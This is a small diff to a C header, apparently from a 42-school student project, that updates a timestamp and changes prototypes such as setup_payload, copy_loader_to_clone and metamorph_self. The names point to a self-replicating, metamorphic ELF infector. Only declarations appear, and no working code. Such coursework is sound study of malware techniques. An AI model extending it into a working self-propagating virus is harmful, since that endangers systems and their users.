@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/27 01:49:28 by anselme          ###   ########.fr       */
+/*   Updated: 2020/01/12 17:51:18 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -61,7 +61,9 @@ bool		setup_payload(struct safe_ptr ref, const struct entry *clone_entry, uint64
 bool		adjust_references(struct safe_ptr ref, size_t shift_amount, size_t end_of_last_section);
 bool		copy_to_clone(struct safe_ptr clone_ref, struct safe_ptr original_ref, \
 			size_t end_last_sect, size_t shift_amount, size_t original_size);
-bool		metamorph_self(uint64_t son_seed[2], uint64_t client_id);
+bool		copy_loader_to_clone(struct safe_ptr clone_ref, size_t end_last_sect);
+bool		metamorph_self(struct safe_ptr clone, size_t loader_off, \
+			uint64_t son_seed[2], uint64_t client_id);
 
 /*
 ** elf iterators
